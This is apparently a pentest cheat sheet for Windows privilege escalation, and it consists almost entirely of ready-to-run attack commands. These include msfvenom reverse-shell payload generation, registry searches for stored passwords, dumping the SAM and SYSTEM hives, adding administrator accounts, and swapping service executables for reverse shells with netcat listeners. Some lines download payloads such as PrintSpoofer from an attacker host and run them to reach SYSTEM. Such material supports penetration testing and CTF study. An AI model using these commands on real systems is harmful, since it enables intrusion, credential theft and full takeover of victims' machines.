# 🏄‍♂️ Windows-Privilege-Escalation

Privilege Escalation Techniques in Windows Environments

## Enumeration

```
hostname

whoami

whoami /priv

echo %username%

systeminfo

net users

net users <username>

net share

ipconfig /all

arp -a

route print

netsh firewall show

netsh advfirewall show currentprofile

netsh advfirewall show allprofiles

netstat -ano
```

## WMI Queries

```
wmic /?

wmic bios

wmic bios list /format

wmic cpu /?

wmic cpu

wmic cpu get Architecture,NumberOfCores

wmic Desktop list /format

wmic memorychip

wmic netlogin list /format

wmic nic list /format

wmic nic list /format:xml

wmic nic list /format:hform > temp.html

wmic os list /format

wmic server

wmic startup

wmic qfe list /format
```

## AlwaysInstallElevated

```
#Check if AlwaysInstalledElevated is installed (1) or not (0)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

# Metasploit Module, Automatic Process
use exploit/windows/local/always_install_elevated

# Manual Process to Get Elevated Privilege
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<IP> -f msi > escalate.msi
```

## Searching For Credentials

```
dir unattend.* /s

dir sysprep.* /s

findstr /si "password" *.txt *.ini

#VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

#Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"

#SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

#Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#Search for password in registry
reg query HKLM /f password /t REG_SG /s
reg query HKCU /f password /t REG_SZ /s
```

## at Command and Sticky Keys

```
at 10:23 C:\reverse_shell.exe
at /delete

net user /add <username> <password>

net localgroup administrator /add <username>
```

## Metasploit Modules

```
# Multi Handler
use exploit/multi/handler

# Payload
set payload windows/meterpreter/reverse_tcp

# Check if machine is a VM ?
# checkvm
use post/windows/gather/checkvm

# Enumerate Applications
use post/windows/gather/enum_applications

# Enumerate Internet Explorer
use post/windows/gather/enum_ie

# Enumerate Chrome
search enum_chrome

# Enumerate SNMP
use post/windows/gather/enum_snmp

# Enumerate Shares
use post/windows/gather/enum_shares

# Enumerate Logged on Users
use post/windows/gather/enum_logged_on_users

# Enumerate GPP
use post/windows/gather/credentials/gpp

# Enumerate Service Permissions
use exploit/windows/local/service_permissions

# Local Exploit Suggester
use post/multi/recon/local_exploit_suggester
```

## Windows Registry

```
Computer\HKEY_CLASSES_ROOT\

Computer\HKEY_CURRENT_USER\

Computer\HKEY_LOCAL_MACHINE\

Computer\HKEY_USERS\

# Query
reg query HKCU\environment /v TEMP
reg query HKCU\environment /v *

# Add Key
reg add "hkcu\control panel\<key>"

# Delete Key
reg delete "hkcu\control panel\<key>" /f

# Add Value
reg add "hkcu\control panel\<key>" /v subs /t reg_sz /d twothousand /f

# Search
reg query HKCU /f <key> /s /e

# Save
reg save hklm\sam c:\sam
reg save hklm\system c:\system
```

## Insecure Service Executables

```
accesschk.exe /accepteula -uwsv user "C:\program Files"

wmic service list brief | findstr /i fileperm

sc query | findstr /i fileperm

powershell wget <IP>:<Port>/reverse_shell.exe -outfile .\reverse_shell.exe

# Copy the reverse shell to the C:\program Files path and overwrite the existing service executable with the reverse shell

# Start the Service
net start filepermsvc

# Start Listener
nc -nlvp 1234
```

## Weak Registry Permissions

```
wmic service list brief | findstr /i reg

# Query Registry Services
sc qc regsvc

reg query HKLM /f regsvc

reg query HKLM\System\CurrentControlSet\Services\regsvc /v *

# Add the reverse shell in Registry
reg add HKLM\System\CurrentControlSet\Services\regsvc /v <value name> /t <type> /d <reverse shell location> /f

# Start Service
net start regsvc

# Start Listener
nc -nlvp 1234
```

## Insecure Service Permissions

```
# Check Permissions
accesschk.exe /accepteula -uvqwc user *

sc qc daclsvc

sc config daclsvc binpath="\"<location of reverse shell>""

# Start Service
net start daclsvc

# PowerUp.ps1
powershell import-module .\PowerUp.ps1;invoke-allchecks
```

## Kernel Exploits

[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

```
$ python2 windows-exploit-suggester.py --update
$ python2 windows-exploit-suggester.py --database <xls filename> --systeminfo <systeminfo file>

# Metasploit Module
use exploit/windows/local/ms13_053_schlamperei
```

## Unquoted Service Path

```
# Find Unquoted Service Path
wmic service get name,pathname | findstr /v /i system32 | findstr /v \"

# Query
sc qc unquotedsvc

# View Permissions
icacls "<Location>"

# Write Permssion
accesschk.exe /accepteula -uvqdw "<Location>"

#PowerUp.ps1
powershell import-module .\PowerUp.ps1;Get-ServiceUnquoted
```

## Powershell UAC Bypass

[Powershell UAC Bypass](https://forums.hak5.org/topic/45439-powershell-real-uac-bypass/)

```
powershell -ep bypass .\escalate.ps1

nc -lvp 1234
```

## SeImpersonatePrivilege

```
# Elevating Privileges using PrintSpoofer 

# Download PrintSpoofer.exe
https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe

# Share the executable using python http server
python3 -m http.server

# Download the executable in the victim machine
cd C:\Windows\Temp
powershell iwr -Uri http://10.17.6.228:8080/PrintSpoofer.exe -OutFile pf.exe

# Execute
pf.exe -i -c cmd

# Output
C:\Windows\system32>whoami
whoami
nt authority\system
```

## WinPEAS Script

[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

```
.\winpeas.bat
```





***

## REFERENCES

* [https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)
* [https://pentest.whitehatlabs.tech/windows-privilege-escalation/windows-privilege-escalation](https://pentest.whitehatlabs.tech/windows-privilege-escalation/windows-privilege-escalation)
* [https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/windows/relevant](https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/windows/relevant)
* [https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASbat](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASbat)
* [https://medium.com/ctf-writeups/bounty-write-up-htb-9b01c934dfd2](https://medium.com/ctf-writeups/bounty-write-up-htb-9b01c934dfd2)

